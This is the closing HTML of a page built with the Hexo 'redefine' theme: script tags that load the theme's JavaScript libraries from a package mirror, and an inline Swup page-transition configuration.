<script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/js/build/libs/Swup.min.js" ></script><script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/js/build/libs/SwupSlideTheme.min.js" ></script><script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/js/build/libs/SwupScriptsPlugin.min.js" ></script><script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/js/build/libs/SwupProgressPlugin.min.js" ></script><script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/js/build/libs/SwupScrollPlugin.min.js" ></script><script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/js/build/libs/SwupPreloadPlugin.min.js" ></script>
<script>
    const swup = new Swup({
        plugins: [
            new SwupScriptsPlugin({
                optin: true,
            }),
            new SwupProgressPlugin(),
            new SwupScrollPlugin({
                offset: 80,
            }),
            new SwupSlideTheme({
                mainElement: ".main-content-body",
            }),
            new SwupPreloadPlugin(),
        ],
        containers: ["#swup"],
    });
</script>




	<script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/js/build/tools/imageViewer.js" ></script><script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/js/build/utils.js" ></script><script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/js/build/main.js" ></script><script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/js/build/layouts/navbarShrink.js" ></script><script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/js/build/tools/scrollTopBottom.js" ></script><script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/js/build/tools/lightDarkSwitch.js" ></script><script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/js/build/layouts/categoryList.js" ></script>


    <script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/js/build/tools/localSearch.js" ></script>



    <script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/js/build/tools/codeBlock.js" ></script>



    <script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/js/build/layouts/lazyload.js" ></script>



    <script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/js/build/tools/runtime.js" ></script>
    <script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/js/build/libs/odometer.min.js" ></script>
    <link rel="stylesheet" href="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/assets/odometer-theme-minimal.css">



  <script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/js/build/libs/Typed.min.js" ></script>
  <script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/js/build/plugins/typed.js" ></script>







    <script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/js/build/libs/anime.min.js" ></script>




    <script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/js/build/tools/tocToggle.js" data-swup-reload-script></script><script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/js/build/layouts/toc.js" data-swup-reload-script></script><script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/js/build/plugins/tabs.js" data-swup-reload-script></script>


<script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/js/build/libs/moment-with-locales.min.js" data-swup-reload-script></script>
<script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/js/build/layouts/essays.js" data-swup-reload-script></script>




	
</body>

</html>